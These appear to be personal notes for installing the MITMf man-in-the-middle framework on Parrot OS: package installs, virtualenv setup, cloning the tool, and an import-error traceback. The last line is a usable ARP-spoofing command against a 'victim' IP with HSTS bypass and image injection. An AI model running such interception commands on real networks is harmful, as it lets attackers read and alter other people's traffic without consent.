# install in parrot

<ol>
  <li>sudo su</li>
    <li>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</li>
      <li>apt-get install libcapstone4</li>
       <li>pip install virtualenvwrapper</li>
        <li>source /usr/local/bin/virtualenvwrapper.sh</li>
         <li>nano ~/.bashrc "enter", paste it at the end of the text without quotes..</li>
⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️
  
  "VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3.9"
  "source /usr/local/bin/virtualenvwrapper.sh" 
 
  
  <li>source ~/.bashrc</li>

  <li>mkvirtualenv MITMf -p /usr/bin/python2.7</li>
  
  <li>git clone https://github.com/byt3bl33d3r/MITMf</li>
  
  <li>cd MITMf && git submodule init && git submodule update --recursive</li>
  
  <li>pip install -r requirements.txt</li>
  
  <li>python mitmf.py --help</li>
  
  </ol>
  
  #ERROR
  Traceback (most recent call last):
  File "mitmf.py", line 29, in <module>
    import core.responder.settings as settings
  File "/home/crypto/programas/MITMf/core/responder/settings.py", line 24, in <module>
    from core.configwatcher import ConfigWatcher
  File "/home/crypto/programas/MITMf/core/configwatcher.py", line 20, in <module>
    import pyinotify
ImportError: No module named pyinotify
-----------------------------------------------------
  !mkvirtualenv MITMf -p /usr/bin/python2.7
  !RUN python mitmf.py --help
                 
python mitmf.py -i wlan0 --spoof --arp --hsts --gateway "ip-router" --target "ip-victim" --imgrand --img-dir <Directory with images> /root/img/
